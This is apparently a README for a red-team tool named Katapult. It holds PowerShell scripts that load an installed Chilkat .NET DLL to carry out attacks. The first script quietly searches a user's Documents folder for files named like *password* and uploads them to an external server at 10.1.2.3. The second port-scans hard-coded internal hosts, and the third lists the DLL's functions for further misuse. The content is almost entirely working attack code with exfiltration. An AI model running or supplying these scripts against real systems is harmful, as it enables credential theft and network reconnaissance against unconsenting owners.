# Katapult

Example of exploiting the Chilkat .NET assembly for Red Team exercises using Powershell.

This example searches the user's MyDocuments folder and uploads file names matching *password* to an external web server.

```powershell
$ErrorActionPreference = 'silentlycontinue'
$ckdll = Resolve-Path -Path "C:\Program Files\*\ChilkatDotNet*dll"
if($ckdll.Path -eq $null) {
   $ckdll = Resolve-Path -Path "C:\Program Files\*\*\ChilkatDotNet*dll"
   if($ckdll.Path -ne $null) {
      $ckpath = $ckdll.Path
   }
} else {
   $ckpath = $ckdll.Path
}
if($ckpath -eq $null) {
   Write-Host "Chilkat DLL not found"
} else {
   $null = [System.Reflection.Assembly]::LoadFrom($ckpath)
   $up = New-Object Chilkat.Upload
   $docs = [environment]::getfolderpath("mydocuments")
   $up.Hostname = "10.1.2.3"
   $up.Port = 8000
   $up.Path = "/upload"
   $up.Expect100Continue = $false
   Get-ChildItem -Path $docs -Recurse -Filter "*password*" | Select-Object -Expand FullName | ForEach-Object {
      $up.AddFileReference("files", $_)
   }
   $null = $up.BlockingUpload()
}
```

This example performs a TCP port scan.

```powershell
$ErrorActionPreference = 'silentlycontinue'
$ckdll = Resolve-Path -Path "C:\Program Files\*\ChilkatDotNet*dll"
if($ckdll.Path -eq $null) {
   $ckdll = Resolve-Path -Path "C:\Program Files\*\*\ChilkatDotNet*dll"
   if($ckdll.Path -ne $null) {
      $ckpath = $ckdll.Path
   }
} else {
   $ckpath = $ckdll.Path
}
if($ckpath -eq $null) {
   Write-Host "Chilkat DLL not found"
} else {
   $null = [System.Reflection.Assembly]::LoadFrom($ckpath)
   $sock = New-Object Chilkat.Socket
   $null = $sock.UnlockComponent("whatever")
   $targets = "10.103.128.3", "10.222.35.250"
   $ports = 21, 22, 23, 80, 443, 445, 389, 3389
   $mswait = 250
   foreach($t in $targets) {
      foreach ($p in $ports) {
         $c = $sock.Connect($t, $p, $false, $mswait)
         if($c -eq $true) {
            Write-Host "SUCCESS: $t port $p"
            $null = $sock.Close($mswait)
         } else {
            Write-Host "FAIL: $t port $p"
         }
      }
   }
}
```

To list other functions you may wish to use.

```powershell
$ErrorActionPreference = 'silentlycontinue'
$ckdll = Resolve-Path -Path "C:\Program Files\*\ChilkatDotNet*dll"
if($ckdll.Path -eq $null) {
   $ckdll = Resolve-Path -Path "C:\Program Files\*\*\ChilkatDotNet*dll"
   if($ckdll.Path -ne $null) {
      $ckpath = $ckdll.Path
   }
} else {
   $ckpath = $ckdll.Path
}
if($ckpath -eq $null) {
   Write-Host "Chilkat DLL not found"
} else {
   $asm = [System.Reflection.Assembly]::LoadFrom($ckpath)
   $asm.GetTypes() | ?{$_.IsPublic} | select Name | sort Name
}
```
